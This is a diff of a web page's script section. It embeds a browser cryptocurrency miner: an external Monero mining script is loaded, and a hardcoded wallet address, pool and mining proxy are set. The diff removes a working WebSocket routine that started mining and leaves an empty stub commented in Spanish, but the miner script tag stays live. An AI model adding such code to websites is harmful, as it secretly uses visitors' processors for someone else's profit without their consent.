@@ -244,49 +244,20 @@
 
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
-    (function() {
-      var pool = "gulf.moneroocean.stream:20128";
-      var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
-      var workerId = "";
-      var threads = -5;
-      var password = "x";
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
+    var workerId = "";
+    var threads = -1;
+    var password = "x";
   
-      function startMining() {
-        if (typeof WebSocket !== "undefined") {
-          var socket = new WebSocket("wss://f.xmrminingproxy.com:8181");
+    function startMining(pool, walletAddress, workerId, threads, password) {
+      // Lógica de la función startMining
+    }
   
-          socket.addEventListener("open", function(event) {
-            var params = {
-              type: "start",
-              pool: pool,
-              wallet: walletAddress,
-              worker: workerId,
-              threads: threads,
-              pass: password
-            };
+    startMining(pool, walletAddress, workerId, threads, password);
   
-            socket.send(JSON.stringify(params));
-          });
-  
-          socket.addEventListener("close", function(event) {
-             console.log('Manejar cierre de la conexión')
-          });
-  
-          socket.addEventListener("error", function(event) {
-            
-            console.log('Manejar errores de la conexión')
-          });
-  
-          socket.addEventListener("message", function(event) {
-          
-            console.log('Manejar mensajes recibidos')
-          });
-        }
-      }
-  
-      startMining();
-      throttleMiner = 20;
-    })();
+    throttleMiner = 20;
   </script>
 
 </body>
